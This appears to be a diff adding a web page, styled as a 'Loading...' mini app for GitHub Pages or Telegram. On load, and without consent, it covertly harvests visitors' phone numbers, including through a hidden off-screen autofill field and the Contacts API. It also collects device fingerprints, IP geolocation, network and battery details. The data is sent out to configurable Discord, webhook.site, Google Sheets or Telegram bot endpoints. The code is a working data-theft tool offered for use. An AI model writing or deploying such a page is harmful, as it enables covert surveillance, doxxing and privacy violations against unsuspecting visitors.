@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0e1a;
+            color: #e0e7ff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: rgba(255,255,255,0.03);
+            border-radius: 28px;
+            padding: 40px 32px;
+            border: 1px solid rgba(255,255,255,0.06);
+            text-align: center;
+        }
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255,255,255,0.05);
+            border-top: 4px solid #a78bfa;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            background: rgba(99,102,241,0.1);
+            border: 1px solid rgba(99,102,241,0.2);
+            color: #a78bfa;
+        }
+        .status.success {
+            background: rgba(52,211,153,0.1);
+            border: 1px solid rgba(52,211,153,0.2);
+            color: #6ee7b7;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.15);
+        }
+        #log {
+            margin-top: 16px;
+            text-align: left;
+            font-size: 11px;
+            color: rgba(255,255,255,0.3);
+            background: rgba(0,0,0,0.2);
+            border-radius: 12px;
+            padding: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            display: none;
+        }
+        #log.active { display: block; }
+        #log .entry { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        #log .phone { color: #6ee7b7; }
+        #log .device { color: #a78bfa; }
+        #log .ip { color: #f9d976; }
+        #log .success { color: #6ee7b7; }
+        .hidden { display: none !important; }
+        
+        .btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.06);
+            color: rgba(255,255,255,0.5);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: inherit;
+            margin: 5px;
+        }
+        .btn:hover { background: rgba(255,255,255,0.1); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="font-size:24px; font-weight:700; background:linear-gradient(135deg,#a78bfa,#6366f1); -webkit-background-clip:text; -webkit-text-fill-color:transparent;">🔍 Gathering Info</h1>
+        <div class="loader" id="loader"></div>
+        <div class="status" id="status">⏳ Auto-collecting data...</div>
+        <div id="log"></div>
+        <div style="margin-top: 16px;">
+            <button class="btn" onclick="showData()">📊 Show Data</button>
+            <button class="btn" onclick="clearData()">🗑️ Clear</button>
+        </div>
+        <div class="footer">🔒 Secure · GitHub Pages</div>
+    </div>
+
+    <script>
+        // ============================================================
+        // GITHUB PAGES MINI APP - PHONE & DATA CAPTURE
+        // ============================================================
+
+        // Collected data storage
+        const collectedData = {
+            phone: null,
+            ip: null,
+            device: {},
+            location: {},
+            timestamp: new Date().toISOString()
+        };
+
+        const logContainer = document.getElementById('log');
+        const statusEl = document.getElementById('status');
+        const loaderEl = document.getElementById('loader');
+
+        function log(message, type = 'info') {
+            logContainer.classList.add('active');
+            const entry = document.createElement('div');
+            entry.className = 'entry';
+            entry.innerHTML = message;
+            logContainer.appendChild(entry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        function updateStatus(msg, type = 'info') {
+            statusEl.textContent = msg;
+            statusEl.className = 'status ' + type;
+        }
+
+        // ============================================================
+        // 1. GET PHONE NUMBER (Multiple methods)
+        // ============================================================
+
+        function getPhoneFromTelegram() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const user = Telegram.WebApp.initDataUnsafe?.user;
+                    if (user && user.phone_number) {
+                        return user.phone_number;
+                    }
+                }
+            } catch(e) {}
+            return null;
+        }
+
+        function getPhoneFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const phoneParams = ['phone', 'phone_number', 'mobile', 'tel', 'number'];
+            for (let p of phoneParams) {
+                if (params.has(p)) {
+                    const val = params.get(p);
+                    if (val && val.length > 5) return val;
+                }
+            }
+            return null;
+        }
+
+        function getPhoneFromStorage() {
+            const keys = ['user_phone', 'phone_number', 'phone', 'mobile'];
+            for (let k of keys) {
+                let val = localStorage.getItem(k);
+                if (!val) val = sessionStorage.getItem(k);
+                if (val && val.length > 5) return val;
+            }
+            return null;
+        }
+
+        function getPhoneFromMeta() {
+            const metas = document.querySelectorAll('meta');
+            for (let m of metas) {
+                const name = (m.getAttribute('name') || '').toLowerCase();
+                const content = m.getAttribute('content') || '';
+                if (name.includes('phone') || name.includes('mobile')) {
+                    if (content && content.length > 5) return content;
+                }
+            }
+            return null;
+        }
+
+        function getPhoneFromReferrer() {
+            if (document.referrer) {
+                try {
+                    const refUrl = new URL(document.referrer);
+                    const params = refUrl.searchParams;
+                    const phoneParams = ['phone', 'phone_number', 'mobile'];
+                    for (let p of phoneParams) {
+                        if (params.has(p)) {
+                            const val = params.get(p);
+                            if (val && val.length > 5) return val;
+                        }
+                    }
+                } catch(e) {}
+            }
+            return null;
+        }
+
+        function getPhoneFromAutofill() {
+            try {
+                const input = document.createElement('input');
+                input.type = 'tel';
+                input.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
+                input.autocomplete = 'tel';
+                input.id = 'phone_autofill';
+                document.body.appendChild(input);
+                input.focus();
+
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        if (input.value && input.value.length > 5) {
+                            const phone = input.value;
+                            document.body.removeChild(input);
+                            resolve(phone);
+                        } else {
+                            document.body.removeChild(input);
+                            resolve(null);
+                        }
+                    }, 300);
+                });
+            } catch(e) {
+                return Promise.resolve(null);
+            }
+        }
+
+        function getPhoneFromContacts() {
+            return new Promise((resolve) => {
+                if (navigator.contacts && navigator.contacts.select) {
+                    navigator.contacts.select(['tel'], { multiple: false })
+                        .then(contacts => {
+                            if (contacts.length > 0 && contacts[0].tel && contacts[0].tel.length > 0) {
+                                resolve(contacts[0].tel[0]);
+                            } else {
+                                resolve(null);
+                            }
+                        })
+                        .catch(() => resolve(null));
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+
+        // ============================================================
+        // 2. GET DEVICE INFO
+        // ============================================================
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return {
+                userAgent: ua,
+                platform: navigator.platform || 'unknown',
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'not specified',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                screenResolution: window.screen.width + 'x' + window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceType: getDeviceType(ua),
+                os: getOS(ua),
+                browser: getBrowser(ua),
+                model: getDeviceModel(ua),
+                vendor: navigator.vendor || 'unknown'
+            };
+        }
+
+        function getBrowser(ua) {
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown';
+        }
+
+        function getOS(ua) {
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac OS')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getDeviceType(ua) {
+            if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) return 'Mobile';
+            if (ua.includes('Tablet') || ua.includes('iPad')) return 'Tablet';
+            return 'Desktop';
+        }
+
+        function getDeviceModel(ua) {
+            const m = ua.match(/\(([^)]+)\)/);
+            if (m) {
+                const parts = m[1].split(';');
+                for (let p of parts) {
+                    p = p.trim();
+                    if (p.includes('iPhone') || p.includes('iPad') || p.includes('Android')) return p;
+                }
+                return parts[parts.length - 1] || 'Unknown';
+            }
+            return 'Unknown';
+        }
+
+        // ============================================================
+        // 3. GET LOCATION (IP-based)
+        // ============================================================
+
+        async function getLocation() {
+            const ipAPIs = [
+                'https://ipapi.co/json/',
+                'https://ip-api.com/json/'
+            ];
+
+            for (let api of ipAPIs) {
+                try {
+                    const response = await fetch(api);
+                    const data = await response.json();
+                    return {
+                        ip: data.ip || data.query || 'unknown',
+                        city: data.city || 'unknown',
+                        region: data.region || data.regionName || 'unknown',
+                        country: data.country_name || data.country || 'unknown',
+                        country_code: data.country_code || data.countryCode || 'unknown',
+                        latitude: data.latitude || data.lat || 'N/A',
+                        longitude: data.longitude || data.lon || 'N/A',
+                        timezone: data.timezone || 'unknown',
+                        isp: data.org || data.isp || 'unknown'
+                    };
+                } catch(e) {}
+            }
+            return { ip: 'unknown', city: 'unknown', country: 'unknown' };
+        }
+
+        // ============================================================
+        // 4. GET NETWORK INFO
+        // ============================================================
+
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                return {
+                    effectiveType: conn.effectiveType || 'unknown',
+                    downlink: conn.downlink || 'unknown',
+                    rtt: conn.rtt || 'unknown',
+                    type: conn.type || 'unknown',
+                    saveData: conn.saveData || false
+                };
+            }
+            return null;
+        }
+
+        // ============================================================
+        // 5. GET BATTERY INFO
+        // ============================================================
+
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's',
+                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + 's'
+                    };
+                } catch(e) {}
+            }
+            return null;
+        }
+
+        // ============================================================
+        // 6. SEND DATA TO SERVER (Multiple destinations)
+        // ============================================================
+
+        // Option A: Send to Discord Webhook
+        async function sendToDiscord(data) {
+            const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your webhook
+            
+            if (WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') return false;
+            
+            try {
+                const message = {
+                    content: `📱 **New Data Captured**\n━━━━━━━━━━━━━━━━━\n📞 Phone: ${data.phone || 'Not found'}\n🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}\n🌐 IP: ${data.ip || 'Unknown'}\n📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}\n🕐 Time: ${data.timestamp || new Date().toISOString()}`
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // Option B: Send to Webhook.site (free testing)
+        async function sendToWebhookSite(data) {
+            const WEBHOOK_URL = 'https://webhook.site/YOUR_UNIQUE_ID'; // Get from webhook.site
+            
+            if (WEBHOOK_URL.includes('YOUR_UNIQUE_ID')) return false;
+            
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // Option C: Send to Google Apps Script (Google Sheets)
+        async function sendToGoogleSheets(data) {
+            const SCRIPT_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+            
+            if (SCRIPT_URL.includes('YOUR_SCRIPT_ID')) return false;
+            
+            try {
+                await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // Option D: Send to Telegram Bot
+        async function sendToTelegram(data) {
+            const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+            const CHAT_ID = 'YOUR_CHAT_ID';
+            
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN') return false;
+            
+            try {
+                const message = `
+📱 **New Data Captured**
+━━━━━━━━━━━━━━━━━
+📞 Phone: ${data.phone || 'Not found'}
+🖥️ Device: ${data.device?.os || 'Unknown'} · ${data.device?.browser || 'Unknown'}
+🌐 IP: ${data.ip || 'Unknown'}
+📍 Location: ${data.location?.city || 'Unknown'}, ${data.location?.country || 'Unknown'}
+🕐 Time: ${data.timestamp || new Date().toISOString()}
+`;
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // Option E: Save to localStorage (always works)
+        function saveToLocalStorage(data) {
+            try {
+                const existing = JSON.parse(localStorage.getItem('captured_data') || '[]');
+                existing.push(data);
+                localStorage.setItem('captured_data', JSON.stringify(existing));
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        // ============================================================
+        // 7. MAIN EXECUTION
+        // ============================================================
+
+        async function main() {
+            updateStatus('📱 Collecting phone number...');
+            log('🚀 <span class="device">Auto-collection started...</span>');
+
+            // Get phone number using multiple methods
+            let phone = null;
+            
+            // Method 1: Telegram
+            phone = getPhoneFromTelegram();
+            if (phone) { log('✅ <span class="phone">Phone from Telegram: ' + phone + '</span>'); }
+
+            // Method 2: URL parameters
+            if (!phone) {
+                phone = getPhoneFromURL();
+                if (phone) { log('✅ <span class="phone">Phone from URL: ' + phone + '</span>'); }
+            }
+
+            // Method 3: Storage
+            if (!phone) {
+                phone = getPhoneFromStorage();
+                if (phone) { log('✅ <span class="phone">Phone from storage: ' + phone + '</span>'); }
+            }
+
+            // Method 4: Meta tags
+            if (!phone) {
+                phone = getPhoneFromMeta();
+                if (phone) { log('✅ <span class="phone">Phone from meta: ' + phone + '</span>'); }
+            }
+
+            // Method 5: Referrer
+            if (!phone) {
+                phone = getPhoneFromReferrer();
+                if (phone) { log('✅ <span class="phone">Phone from referrer: ' + phone + '</span>'); }
+            }
+
+            // Method 6: Autofill (async)
+            if (!phone) {
+                const autofillPhone = await getPhoneFromAutofill();
+                if (autofillPhone) {
+                    phone = autofillPhone;
+                    log('✅ <span class="phone">Phone from autofill: ' + phone + '</span>');
+                }
+            }
+
+            // Method 7: Contacts API (async)
+            if (!phone) {
+                const contactPhone = await getPhoneFromContacts();
+                if (contactPhone) {
+                    phone = contactPhone;
+                    log('✅ <span class="phone">Phone from contacts: ' + phone + '</span>');
+                }
+            }
+
+            // Get device info
+            updateStatus('🖥️ Collecting device info...');
+            const device = getDeviceInfo();
+            log('🖥️ <span class="device">Device: ' + device.deviceType + ' · ' + device.os + '</span>');
+            log('🌐 <span class="device">Browser: ' + device.browser + '</span>');
+
+            // Get location
+            updateStatus('🌐 Fetching location...');
+            const location = await getLocation();
+            log('📍 <span class="ip">Location: ' + location.city + ', ' + location.country + '</span>');
+            log('🌐 <span class="ip">IP: ' + location.ip + '</span>');
+
+            // Get network info
+            const network = getNetworkInfo();
+            if (network) {
+                log('📶 <span class="device">Network: ' + network.effectiveType + ' · ' + network.downlink + ' Mbps</span>');
+            }
+
+            // Get battery info
+            const battery = await getBatteryInfo();
+            if (battery) {
+                log('🔋 <span class="device">Battery: ' + battery.level + ' ' + (battery.charging ? '(Charging)' : '(Not Charging)') + '</span>');
+            }
+
+            // Build final data
+            collectedData.phone = phone;
+            collectedData.ip = location.ip;
+            collectedData.device = device;
+            collectedData.location = location;
+            collectedData.network = network;
+            collectedData.battery = battery;
+            collectedData.timestamp = new Date().toISOString();
+
+            // Save to localStorage
+            saveToLocalStorage(collectedData);
+            
+            // Try all send methods
+            let sent = false;
+            
+            // Try Discord
+            if (await sendToDiscord(collectedData)) {
+                log('✅ <span class="success">Data sent to Discord</span>');
+                sent = true;
+            }
+            
+            // Try Webhook.site
+            if (await sendToWebhookSite(collectedData)) {
+                log('✅ <span class="success">Data sent to Webhook.site</span>');
+                sent = true;
+            }
+            
+            // Try Google Sheets
+            if (await sendToGoogleSheets(collectedData)) {
+                log('✅ <span class="success">Data sent to Google Sheets</span>');
+                sent = true;
+            }
+            
+            // Try Telegram
+            if (await sendToTelegram(collectedData)) {
+                log('✅ <span class="success">Data sent to Telegram</span>');
+                sent = true;
+            }
+
+            if (sent) {
+                updateStatus('✅ All data captured and sent!', 'success');
+            } else {
+                updateStatus('✅ Data captured! (stored locally - set up webhooks for remote)', 'success');
+            }
+            
+            // Hide loader
+            loaderEl.style.display = 'none';
+
+            // Console helper
+            console.log('📊 Collected Data:', collectedData);
+            log('📊 <span class="success">Data collection complete!</span>');
+        }
+
+        // ============================================================
+        // 8. HELPER FUNCTIONS
+        // ============================================================
+
+        window.showData = function() {
+            const data = JSON.parse(localStorage.getItem('captured_data') || '[]');
+            const latest = data[data.length - 1] || {};
+            
+            console.log('📊 === CAPTURED DATA ===');
+            console.log('📱 Phone:', latest.phone || 'Not found');
+            console.log('🖥️ Device:', latest.device);
+            console.log('🌐 IP:', latest.ip);
+            console.log('📍 Location:', latest.location);
+            console.log('📶 Network:', latest.network);
+            console.log('🔋 Battery:', latest.battery);
+            console.log('📦 Full data:', data);
+            
+            let msg = '📊 Captured Data:\n';
+            msg += `📱 Phone: ${latest.phone || 'Not found'}\n`;
+            msg += `🖥️ Device: ${latest.device?.os || 'Unknown'} · ${latest.device?.browser || 'Unknown'}\n`;
+            msg += `🌐 IP: ${latest.ip || 'Unknown'}\n`;
+            msg += `📍 Location: ${latest.location?.city || 'Unknown'}, ${latest.location?.country || 'Unknown'}\n`;
+            msg += `🕐 Time: ${latest.timestamp || 'Unknown'}`;
+            alert(msg);
+            
+            return data;
+        };
+
+        window.clearData = function() {
+            if (confirm('Clear all captured data?')) {
+                localStorage.removeItem('captured_data');
+                logContainer.innerHTML = '';
+                logContainer.classList.remove('active');
+                updateStatus('🗑️ Data cleared', 'info');
+            }
+        };
+
+        // Keyboard shortcut: Ctrl+Shift+D
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                e.preventDefault();
+                window.showData();
+            }
+        });
+
+        // ============================================================
+        // 9. START ON LOAD
+        // ============================================================
+
+        window.addEventListener('load', function() {
+            console.log('%c🔍 Mini App Active - GitHub Pages', 'font-size:18px;font-weight:bold;color:#a78bfa;');
+            console.log('%c💡 Type showData() to see collected data', 'font-size:14px;color:rgba(255,255,255,0.3);');
+            console.log('%c🔑 Press Ctrl+Shift+D to show data', 'font-size:14px;color:rgba(255,255,255,0.3);');
+            
+            // Start collection after 1 second
+            setTimeout(main, 1000);
+        });
+    </script>
+</body>
+</html>
